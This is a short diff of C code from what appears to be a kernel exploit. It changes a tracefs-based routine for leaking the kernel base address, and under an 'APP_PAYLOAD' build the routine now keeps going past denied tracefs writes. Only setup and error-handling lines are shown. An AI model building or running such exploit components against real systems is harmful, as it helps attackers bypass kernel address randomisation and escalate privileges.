@@ -83,31 +83,35 @@ static int slide_tracefs_leak_kernel_base(void) {
 
   int tracing_ready = slide_tracefs_write(tracing_on, "0");
   int event_ready = slide_tracefs_write(event_enable, "1");
+  int tracing_started = 0;
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
   if (!tracing_ready) {
-    pr_error("slide tracefs control setup failed errno=%d\n", errno);
-    return 0;
+    pr_warning("slide tracefs control denied; probing existing events\n");
   }
   if (!event_ready) {
     pr_warning("slide tracefs event enable denied; probing existing events\n");
   }
-  if (!slide_tracefs_write(tracing_on, "1")) {
-    pr_error("slide tracefs start failed errno=%d\n", errno);
-    return 0;
+  if (tracing_ready && slide_tracefs_write(tracing_on, "1")) {
+    tracing_started = 1;
   }
 #else
   if (!tracing_ready || !event_ready || !slide_tracefs_write(tracing_on, "1")) {
     pr_error("slide tracefs setup failed errno=%d\n", errno);
     return 0;
   }
+  tracing_started = 1;
 #endif
 
-  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
-  if (trace_fd >= 0) {
-    close(trace_fd);
+  if (tracing_started) {
+    int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
+    if (trace_fd >= 0) {
+      close(trace_fd);
+    }
+    sleep(1);
+    slide_tracefs_write(tracing_on, "0");
+  } else {
+    usleep(200000);
   }
-  sleep(1);
-  slide_tracefs_write(tracing_on, "0");
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   uintptr_t candidate = 0;
